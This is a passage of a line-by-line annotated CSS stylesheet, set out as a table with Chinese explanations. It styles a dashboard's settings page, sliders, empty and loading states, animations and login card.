| 1544 | 选择器：指定接下来要设置样式的页面元素。 | `.badge--source {` |
| 1545 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-secondary);` |
| 1546 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--surface-raised);` |
| 1547 | 样式属性：设置 `border-color` 的视觉或布局效果。 | `  border-color: var(--border-default);` |
| 1548 | 样式属性：设置 `text-transform` 的视觉或布局效果。 | `  text-transform: none;` |
| 1549 | 样式属性：设置 `letter-spacing` 的视觉或布局效果。 | `  letter-spacing: 0;` |
| 1550 | 样式属性：设置 `font-family` 的视觉或布局效果。 | `  font-family: var(--font-mono);` |
| 1551 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: 11px;` |
| 1552 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1553 | 空行：分隔样式规则。 | `&nbsp;` |
| 1554 | 样式注释：说明这一段 CSS 的用途。 | `/* 抽屉内：测试终端容器 */` |
| 1555 | 选择器：指定接下来要设置样式的页面元素。 | `.drawer .terminal {` |
| 1556 | 样式属性：设置 `max-height` 的视觉或布局效果。 | `  max-height: 220px;` |
| 1557 | 样式属性：设置 `overflow` 的视觉或布局效果。 | `  overflow: auto;` |
| 1558 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1559 | 空行：分隔样式规则。 | `&nbsp;` |
| 1560 | 样式注释：说明这一段 CSS 的用途。 | `/* =============================================================` |
| 1561 | 样式注释：说明这一段 CSS 的用途。 | ` * 设置页 —— 可写/只读分区 + 滑块 + 条目式布局` |
| 1562 | 样式注释：说明这一段 CSS 的用途。 | ` * ============================================================= */` |
| 1563 | 选择器：指定接下来要设置样式的页面元素。 | `.settings-shell {` |
| 1564 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 1565 | 样式属性：设置 `flex-direction` 的视觉或布局效果。 | `  flex-direction: column;` |
| 1566 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-lg);` |
| 1567 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1568 | 空行：分隔样式规则。 | `&nbsp;` |
| 1569 | 选择器：指定接下来要设置样式的页面元素。 | `.settings-section {` |
| 1570 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--surface-dark);` |
| 1571 | 样式属性：设置 `border` 的视觉或布局效果。 | `  border: 1px solid var(--border-subtle);` |
| 1572 | 样式属性：设置 `border-radius` 的视觉或布局效果。 | `  border-radius: var(--radius-lg);` |
| 1573 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1574 | 空行：分隔样式规则。 | `&nbsp;` |
| 1575 | 选择器：指定接下来要设置样式的页面元素。 | `.settings-section__header {` |
| 1576 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: var(--space-md) var(--space-lg);` |
| 1577 | 样式属性：设置 `border-bottom` 的视觉或布局效果。 | `  border-bottom: 1px solid var(--border-subtle);` |
| 1578 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 1579 | 样式属性：设置 `align-items` 的视觉或布局效果。 | `  align-items: center;` |
| 1580 | 样式属性：设置 `justify-content` 的视觉或布局效果。 | `  justify-content: space-between;` |
| 1581 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-md);` |
| 1582 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1583 | 空行：分隔样式规则。 | `&nbsp;` |
| 1584 | 选择器：指定接下来要设置样式的页面元素。 | `.settings-section__title {` |
| 1585 | 样式属性：设置 `margin` 的视觉或布局效果。 | `  margin: 0;` |
| 1586 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-h3);` |
| 1587 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-primary);` |
| 1588 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1589 | 空行：分隔样式规则。 | `&nbsp;` |
| 1590 | 选择器：指定接下来要设置样式的页面元素。 | `.settings-section__caption {` |
| 1591 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-tertiary);` |
| 1592 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 1593 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1594 | 空行：分隔样式规则。 | `&nbsp;` |
| 1595 | 选择器：指定接下来要设置样式的页面元素。 | `.settings-section__body {` |
| 1596 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: var(--space-lg);` |
| 1597 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 1598 | 样式属性：设置 `flex-direction` 的视觉或布局效果。 | `  flex-direction: column;` |
| 1599 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-lg);` |
| 1600 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1601 | 空行：分隔样式规则。 | `&nbsp;` |
| 1602 | 样式注释：说明这一段 CSS 的用途。 | `/* 单条：左（label + hint）右（控件） */` |
| 1603 | 选择器：指定接下来要设置样式的页面元素。 | `.settings-field {` |
| 1604 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: grid;` |
| 1605 | 样式属性：设置 `grid-template-columns` 的视觉或布局效果。 | `  grid-template-columns: minmax(180px, 260px) 1fr;` |
| 1606 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-md) var(--space-lg);` |
| 1607 | 样式属性：设置 `align-items` 的视觉或布局效果。 | `  align-items: start;` |
| 1608 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1609 | 空行：分隔样式规则。 | `&nbsp;` |
| 1610 | 选择器：指定接下来要设置样式的页面元素。 | `.settings-field__head {` |
| 1611 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 1612 | 样式属性：设置 `flex-direction` 的视觉或布局效果。 | `  flex-direction: column;` |
| 1613 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: 4px;` |
| 1614 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1615 | 空行：分隔样式规则。 | `&nbsp;` |
| 1616 | 选择器：指定接下来要设置样式的页面元素。 | `.settings-field__label {` |
| 1617 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-primary);` |
| 1618 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-body);` |
| 1619 | 样式属性：设置 `font-weight` 的视觉或布局效果。 | `  font-weight: 500;` |
| 1620 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1621 | 空行：分隔样式规则。 | `&nbsp;` |
| 1622 | 选择器：指定接下来要设置样式的页面元素。 | `.settings-field__hint {` |
| 1623 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-tertiary);` |
| 1624 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 1625 | 样式属性：设置 `line-height` 的视觉或布局效果。 | `  line-height: 1.6;` |
| 1626 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1627 | 空行：分隔样式规则。 | `&nbsp;` |
| 1628 | 选择器：指定接下来要设置样式的页面元素。 | `.settings-field__control {` |
| 1629 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 1630 | 样式属性：设置 `flex-direction` 的视觉或布局效果。 | `  flex-direction: column;` |
| 1631 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-xs);` |
| 1632 | 样式属性：设置 `min-width` 的视觉或布局效果。 | `  min-width: 0;` |
| 1633 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1634 | 空行：分隔样式规则。 | `&nbsp;` |
| 1635 | 样式语句：参与页面视觉布局。 | `.settings-field__control .form-input,` |
| 1636 | 样式语句：参与页面视觉布局。 | `.settings-field__control .form-select,` |
| 1637 | 选择器：指定接下来要设置样式的页面元素。 | `.settings-field__control .form-textarea {` |
| 1638 | 样式属性：设置 `max-width` 的视觉或布局效果。 | `  max-width: 360px;` |
| 1639 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1640 | 空行：分隔样式规则。 | `&nbsp;` |
| 1641 | 样式语句：参与页面视觉布局。 | `.settings-field__control--wide .form-input,` |
| 1642 | 选择器：指定接下来要设置样式的页面元素。 | `.settings-field__control--wide .form-textarea {` |
| 1643 | 样式属性：设置 `max-width` 的视觉或布局效果。 | `  max-width: none;` |
| 1644 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1645 | 空行：分隔样式规则。 | `&nbsp;` |
| 1646 | 选择器：指定接下来要设置样式的页面元素。 | `.settings-field__error {` |
| 1647 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--threat-high);` |
| 1648 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 1649 | 样式属性：设置 `min-height` 的视觉或布局效果。 | `  min-height: 16px;` |
| 1650 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1651 | 空行：分隔样式规则。 | `&nbsp;` |
| 1652 | 选择器：指定接下来要设置样式的页面元素。 | `.settings-field__readonly {` |
| 1653 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: inline-flex;` |
| 1654 | 样式属性：设置 `align-items` 的视觉或布局效果。 | `  align-items: center;` |
| 1655 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-sm);` |
| 1656 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: 6px 10px;` |
| 1657 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--surface-raised);` |
| 1658 | 样式属性：设置 `border` 的视觉或布局效果。 | `  border: 1px dashed var(--border-default);` |
| 1659 | 样式属性：设置 `border-radius` 的视觉或布局效果。 | `  border-radius: var(--radius-md);` |
| 1660 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-primary);` |
| 1661 | 样式属性：设置 `font-family` 的视觉或布局效果。 | `  font-family: var(--font-mono);` |
| 1662 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-mono);` |
| 1663 | 样式属性：设置 `min-height` 的视觉或布局效果。 | `  min-height: 34px;` |
| 1664 | 样式属性：设置 `word-break` 的视觉或布局效果。 | `  word-break: break-all;` |
| 1665 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1666 | 空行：分隔样式规则。 | `&nbsp;` |
| 1667 | 选择器：指定接下来要设置样式的页面元素。 | `.settings-field__readonly-hint {` |
| 1668 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-tertiary);` |
| 1669 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 1670 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1671 | 空行：分隔样式规则。 | `&nbsp;` |
| 1672 | 选择器：指定接下来要设置样式的页面元素。 | `@media (max-width: 767px) {` |
| 1673 | 选择器：指定接下来要设置样式的页面元素。 | `  .settings-field {` |
| 1674 | 样式属性：设置 `grid-template-columns` 的视觉或布局效果。 | `    grid-template-columns: 1fr;` |
| 1675 | 规则结束：结束当前 CSS 选择器的样式定义。 | `  }` |
| 1676 | 样式语句：参与页面视觉布局。 | `  .settings-field__control .form-input,` |
| 1677 | 选择器：指定接下来要设置样式的页面元素。 | `  .settings-field__control .form-select {` |
| 1678 | 样式属性：设置 `max-width` 的视觉或布局效果。 | `    max-width: none;` |
| 1679 | 规则结束：结束当前 CSS 选择器的样式定义。 | `  }` |
| 1680 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1681 | 空行：分隔样式规则。 | `&nbsp;` |
| 1682 | 样式注释：说明这一段 CSS 的用途。 | `/* 滑块（原生 range 的统一外观） */` |
| 1683 | 选择器：指定接下来要设置样式的页面元素。 | `.slider-row {` |
| 1684 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 1685 | 样式属性：设置 `align-items` 的视觉或布局效果。 | `  align-items: center;` |
| 1686 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-md);` |
| 1687 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1688 | 空行：分隔样式规则。 | `&nbsp;` |
| 1689 | 选择器：指定接下来要设置样式的页面元素。 | `.slider-row input[type="range"] {` |
| 1690 | 样式属性：设置 `flex` 的视觉或布局效果。 | `  flex: 1;` |
| 1691 | 样式属性：设置 `-webkit-appearance` 的视觉或布局效果。 | `  -webkit-appearance: none;` |
| 1692 | 样式属性：设置 `appearance` 的视觉或布局效果。 | `  appearance: none;` |
| 1693 | 样式属性：设置 `height` 的视觉或布局效果。 | `  height: 4px;` |
| 1694 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--surface-raised);` |
| 1695 | 样式属性：设置 `border-radius` 的视觉或布局效果。 | `  border-radius: 999px;` |
| 1696 | 样式属性：设置 `outline` 的视觉或布局效果。 | `  outline: none;` |
| 1697 | 样式属性：设置 `cursor` 的视觉或布局效果。 | `  cursor: pointer;` |
| 1698 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1699 | 空行：分隔样式规则。 | `&nbsp;` |
| 1700 | 选择器：指定接下来要设置样式的页面元素。 | `.slider-row input[type="range"]::-webkit-slider-thumb {` |
| 1701 | 样式属性：设置 `-webkit-appearance` 的视觉或布局效果。 | `  -webkit-appearance: none;` |
| 1702 | 样式属性：设置 `appearance` 的视觉或布局效果。 | `  appearance: none;` |
| 1703 | 样式属性：设置 `width` 的视觉或布局效果。 | `  width: 16px;` |
| 1704 | 样式属性：设置 `height` 的视觉或布局效果。 | `  height: 16px;` |
| 1705 | 样式属性：设置 `border-radius` 的视觉或布局效果。 | `  border-radius: 50%;` |
| 1706 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--accent-emerald);` |
| 1707 | 样式属性：设置 `border` 的视觉或布局效果。 | `  border: 2px solid var(--surface-dark);` |
| 1708 | 样式属性：设置 `box-shadow` 的视觉或布局效果。 | `  box-shadow: var(--shadow-1);` |
| 1709 | 样式属性：设置 `cursor` 的视觉或布局效果。 | `  cursor: pointer;` |
| 1710 | 样式属性：设置 `transition` 的视觉或布局效果。 | `  transition: transform 0.15s ease;` |
| 1711 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1712 | 空行：分隔样式规则。 | `&nbsp;` |
| 1713 | 选择器：指定接下来要设置样式的页面元素。 | `.slider-row input[type="range"]::-webkit-slider-thumb:hover {` |
| 1714 | 样式属性：设置 `transform` 的视觉或布局效果。 | `  transform: scale(1.1);` |
| 1715 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1716 | 空行：分隔样式规则。 | `&nbsp;` |
| 1717 | 选择器：指定接下来要设置样式的页面元素。 | `.slider-row input[type="range"]::-moz-range-thumb {` |
| 1718 | 样式属性：设置 `width` 的视觉或布局效果。 | `  width: 16px;` |
| 1719 | 样式属性：设置 `height` 的视觉或布局效果。 | `  height: 16px;` |
| 1720 | 样式属性：设置 `border-radius` 的视觉或布局效果。 | `  border-radius: 50%;` |
| 1721 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--accent-emerald);` |
| 1722 | 样式属性：设置 `border` 的视觉或布局效果。 | `  border: 2px solid var(--surface-dark);` |
| 1723 | 样式属性：设置 `cursor` 的视觉或布局效果。 | `  cursor: pointer;` |
| 1724 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1725 | 空行：分隔样式规则。 | `&nbsp;` |
| 1726 | 选择器：指定接下来要设置样式的页面元素。 | `.slider-row input[type="range"]:focus-visible {` |
| 1727 | 样式属性：设置 `outline` 的视觉或布局效果。 | `  outline: 2px solid var(--accent-emerald);` |
| 1728 | 样式属性：设置 `outline-offset` 的视觉或布局效果。 | `  outline-offset: 3px;` |
| 1729 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1730 | 空行：分隔样式规则。 | `&nbsp;` |
| 1731 | 选择器：指定接下来要设置样式的页面元素。 | `.slider-row .slider-value {` |
| 1732 | 样式属性：设置 `min-width` 的视觉或布局效果。 | `  min-width: 56px;` |
| 1733 | 样式属性：设置 `text-align` 的视觉或布局效果。 | `  text-align: right;` |
| 1734 | 样式属性：设置 `font-family` 的视觉或布局效果。 | `  font-family: var(--font-mono);` |
| 1735 | 样式属性：设置 `font-variant-numeric` 的视觉或布局效果。 | `  font-variant-numeric: tabular-nums;` |
| 1736 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-primary);` |
| 1737 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1738 | 空行：分隔样式规则。 | `&nbsp;` |
| 1739 | 样式注释：说明这一段 CSS 的用途。 | `/* 设置页粘性底栏：保存/重置 */` |
| 1740 | 选择器：指定接下来要设置样式的页面元素。 | `.settings-actions {` |
| 1741 | 样式属性：设置 `position` 的视觉或布局效果。 | `  position: sticky;` |
| 1742 | 样式属性：设置 `bottom` 的视觉或布局效果。 | `  bottom: 0;` |
| 1743 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: linear-gradient(` |
| 1744 | 样式语句：参与页面视觉布局。 | `    to top,` |
| 1745 | 样式语句：参与页面视觉布局。 | `    var(--bg-void) 65%,` |
| 1746 | 样式语句：参与页面视觉布局。 | `    rgba(10, 10, 11, 0)` |
| 1747 | 样式语句：参与页面视觉布局。 | `  );` |
| 1748 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: var(--space-md) 0 var(--space-lg);` |
| 1749 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 1750 | 样式属性：设置 `justify-content` 的视觉或布局效果。 | `  justify-content: flex-end;` |
| 1751 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-sm);` |
| 1752 | 样式属性：设置 `z-index` 的视觉或布局效果。 | `  z-index: 5;` |
| 1753 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1754 | 空行：分隔样式规则。 | `&nbsp;` |
| 1755 | 选择器：指定接下来要设置样式的页面元素。 | `.settings-actions__status {` |
| 1756 | 样式属性：设置 `margin-right` 的视觉或布局效果。 | `  margin-right: auto;` |
| 1757 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-tertiary);` |
| 1758 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 1759 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 1760 | 样式属性：设置 `align-items` 的视觉或布局效果。 | `  align-items: center;` |
| 1761 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-sm);` |
| 1762 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1763 | 空行：分隔样式规则。 | `&nbsp;` |
| 1764 | 选择器：指定接下来要设置样式的页面元素。 | `.settings-actions__status--dirty {` |
| 1765 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--threat-medium);` |
| 1766 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1767 | 空行：分隔样式规则。 | `&nbsp;` |
| 1768 | 选择器：指定接下来要设置样式的页面元素。 | `.settings-actions__status--saved {` |
| 1769 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--accent-emerald);` |
| 1770 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1771 | 空行：分隔样式规则。 | `&nbsp;` |
| 1772 | 样式注释：说明这一段 CSS 的用途。 | `/* 通知字段：输入 + 测试按钮行 */` |
| 1773 | 选择器：指定接下来要设置样式的页面元素。 | `.settings-inline {` |
| 1774 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 1775 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-sm);` |
| 1776 | 样式属性：设置 `align-items` 的视觉或布局效果。 | `  align-items: stretch;` |
| 1777 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1778 | 空行：分隔样式规则。 | `&nbsp;` |
| 1779 | 选择器：指定接下来要设置样式的页面元素。 | `.settings-inline .form-input {` |
| 1780 | 样式属性：设置 `flex` 的视觉或布局效果。 | `  flex: 1;` |
| 1781 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1782 | 空行：分隔样式规则。 | `&nbsp;` |
| 1783 | 选择器：指定接下来要设置样式的页面元素。 | `.settings-test-result {` |
| 1784 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 1785 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-tertiary);` |
| 1786 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1787 | 空行：分隔样式规则。 | `&nbsp;` |
| 1788 | 选择器：指定接下来要设置样式的页面元素。 | `.settings-test-result--ok {` |
| 1789 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--accent-emerald);` |
| 1790 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1791 | 空行：分隔样式规则。 | `&nbsp;` |
| 1792 | 选择器：指定接下来要设置样式的页面元素。 | `.settings-test-result--err {` |
| 1793 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--threat-high);` |
| 1794 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1795 | 空行：分隔样式规则。 | `&nbsp;` |
| 1796 | 样式注释：说明这一段 CSS 的用途。 | `/* =============================================================` |
| 1797 | 样式注释：说明这一段 CSS 的用途。 | ` * 空态 / 加载态` |
| 1798 | 样式注释：说明这一段 CSS 的用途。 | ` * ============================================================= */` |
| 1799 | 选择器：指定接下来要设置样式的页面元素。 | `.empty-state {` |
| 1800 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: var(--space-2xl) var(--space-lg);` |
| 1801 | 样式属性：设置 `text-align` 的视觉或布局效果。 | `  text-align: center;` |
| 1802 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-tertiary);` |
| 1803 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 1804 | 样式属性：设置 `flex-direction` 的视觉或布局效果。 | `  flex-direction: column;` |
| 1805 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-sm);` |
| 1806 | 样式属性：设置 `align-items` 的视觉或布局效果。 | `  align-items: center;` |
| 1807 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1808 | 空行：分隔样式规则。 | `&nbsp;` |
| 1809 | 选择器：指定接下来要设置样式的页面元素。 | `.empty-state__title {` |
| 1810 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-body);` |
| 1811 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-secondary);` |
| 1812 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1813 | 空行：分隔样式规则。 | `&nbsp;` |
| 1814 | 选择器：指定接下来要设置样式的页面元素。 | `.empty-state__hint {` |
| 1815 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 1816 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1817 | 空行：分隔样式规则。 | `&nbsp;` |
| 1818 | 选择器：指定接下来要设置样式的页面元素。 | `.loader {` |
| 1819 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: inline-block;` |
| 1820 | 样式属性：设置 `width` 的视觉或布局效果。 | `  width: 16px;` |
| 1821 | 样式属性：设置 `height` 的视觉或布局效果。 | `  height: 16px;` |
| 1822 | 样式属性：设置 `border` 的视觉或布局效果。 | `  border: 2px solid var(--border-default);` |
| 1823 | 样式属性：设置 `border-top-color` 的视觉或布局效果。 | `  border-top-color: var(--accent-emerald);` |
| 1824 | 样式属性：设置 `border-radius` 的视觉或布局效果。 | `  border-radius: 50%;` |
| 1825 | 样式属性：设置 `animation` 的视觉或布局效果。 | `  animation: spin 0.8s linear infinite;` |
| 1826 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1827 | 空行：分隔样式规则。 | `&nbsp;` |
| 1828 | 选择器：指定接下来要设置样式的页面元素。 | `@keyframes spin {` |
| 1829 | 选择器：指定接下来要设置样式的页面元素。 | `  to {` |
| 1830 | 样式属性：设置 `transform` 的视觉或布局效果。 | `    transform: rotate(360deg);` |
| 1831 | 规则结束：结束当前 CSS 选择器的样式定义。 | `  }` |
| 1832 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1833 | 空行：分隔样式规则。 | `&nbsp;` |
| 1834 | 样式注释：说明这一段 CSS 的用途。 | `/* =============================================================` |
| 1835 | 样式注释：说明这一段 CSS 的用途。 | ` * 动画关键帧 — DESIGN.md §7` |
| 1836 | 样式注释：说明这一段 CSS 的用途。 | ` * ============================================================= */` |
| 1837 | 选择器：指定接下来要设置样式的页面元素。 | `@keyframes pulse-glow {` |
| 1838 | 样式语句：参与页面视觉布局。 | `  0%,` |
| 1839 | 选择器：指定接下来要设置样式的页面元素。 | `  100% {` |
| 1840 | 样式属性：设置 `box-shadow` 的视觉或布局效果。 | `    box-shadow: 0 0 4px rgba(236, 72, 153, 0.3);` |
| 1841 | 规则结束：结束当前 CSS 选择器的样式定义。 | `  }` |
| 1842 | 选择器：指定接下来要设置样式的页面元素。 | `  50% {` |
| 1843 | 样式属性：设置 `box-shadow` 的视觉或布局效果。 | `    box-shadow: 0 0 16px rgba(236, 72, 153, 0.6);` |
| 1844 | 规则结束：结束当前 CSS 选择器的样式定义。 | `  }` |
| 1845 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1846 | 空行：分隔样式规则。 | `&nbsp;` |
| 1847 | 选择器：指定接下来要设置样式的页面元素。 | `@keyframes slide-in {` |
| 1848 | 选择器：指定接下来要设置样式的页面元素。 | `  from {` |
| 1849 | 样式属性：设置 `opacity` 的视觉或布局效果。 | `    opacity: 0;` |
| 1850 | 样式属性：设置 `transform` 的视觉或布局效果。 | `    transform: translateX(-8px);` |
| 1851 | 规则结束：结束当前 CSS 选择器的样式定义。 | `  }` |
| 1852 | 选择器：指定接下来要设置样式的页面元素。 | `  to {` |
| 1853 | 样式属性：设置 `opacity` 的视觉或布局效果。 | `    opacity: 1;` |
| 1854 | 样式属性：设置 `transform` 的视觉或布局效果。 | `    transform: translateX(0);` |
| 1855 | 规则结束：结束当前 CSS 选择器的样式定义。 | `  }` |
| 1856 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1857 | 空行：分隔样式规则。 | `&nbsp;` |
| 1858 | 选择器：指定接下来要设置样式的页面元素。 | `@keyframes fade-in {` |
| 1859 | 选择器：指定接下来要设置样式的页面元素。 | `  from {` |
| 1860 | 样式属性：设置 `opacity` 的视觉或布局效果。 | `    opacity: 0;` |
| 1861 | 规则结束：结束当前 CSS 选择器的样式定义。 | `  }` |
| 1862 | 选择器：指定接下来要设置样式的页面元素。 | `  to {` |
| 1863 | 样式属性：设置 `opacity` 的视觉或布局效果。 | `    opacity: 1;` |
| 1864 | 规则结束：结束当前 CSS 选择器的样式定义。 | `  }` |
| 1865 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1866 | 空行：分隔样式规则。 | `&nbsp;` |
| 1867 | 样式注释：说明这一段 CSS 的用途。 | `/* =============================================================` |
| 1868 | 样式注释：说明这一段 CSS 的用途。 | ` * 登录页（独立布局，不共享侧边栏）` |
| 1869 | 样式注释：说明这一段 CSS 的用途。 | ` * ============================================================= */` |
| 1870 | 选择器：指定接下来要设置样式的页面元素。 | `.login-shell {` |
| 1871 | 样式属性：设置 `min-height` 的视觉或布局效果。 | `  min-height: 100vh;` |
| 1872 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: grid;` |
| 1873 | 样式属性：设置 `place-items` 的视觉或布局效果。 | `  place-items: center;` |
| 1874 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: var(--space-lg);` |
| 1875 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background:` |
| 1876 | 样式语句：参与页面视觉布局。 | `    radial-gradient(` |
| 1877 | 样式语句：参与页面视觉布局。 | `      circle at 20% 20%,` |
| 1878 | 样式语句：参与页面视觉布局。 | `      rgba(16, 185, 129, 0.08),` |
| 1879 | 样式语句：参与页面视觉布局。 | `      transparent 60%` |
| 1880 | 样式语句：参与页面视觉布局。 | `    ),` |
| 1881 | 样式语句：参与页面视觉布局。 | `    radial-gradient(` |
| 1882 | 样式语句：参与页面视觉布局。 | `      circle at 80% 80%,` |
| 1883 | 样式语句：参与页面视觉布局。 | `      rgba(59, 130, 246, 0.06),` |
| 1884 | 样式语句：参与页面视觉布局。 | `      transparent 55%` |
| 1885 | 样式语句：参与页面视觉布局。 | `    ),` |
| 1886 | 样式语句：参与页面视觉布局。 | `    var(--bg-void);` |
| 1887 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1888 | 空行：分隔样式规则。 | `&nbsp;` |
| 1889 | 选择器：指定接下来要设置样式的页面元素。 | `.login-card {` |
| 1890 | 样式属性：设置 `width` 的视觉或布局效果。 | `  width: min(420px, 100%);` |
| 1891 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--surface-dark);` |
| 1892 | 样式属性：设置 `border` 的视觉或布局效果。 | `  border: 1px solid var(--border-subtle);` |
| 1893 | 样式属性：设置 `border-radius` 的视觉或布局效果。 | `  border-radius: var(--radius-xl);` |
| 1894 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: var(--space-xl);` |
| 1895 | 样式属性：设置 `box-shadow` 的视觉或布局效果。 | `  box-shadow: var(--shadow-3);` |
| 1896 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
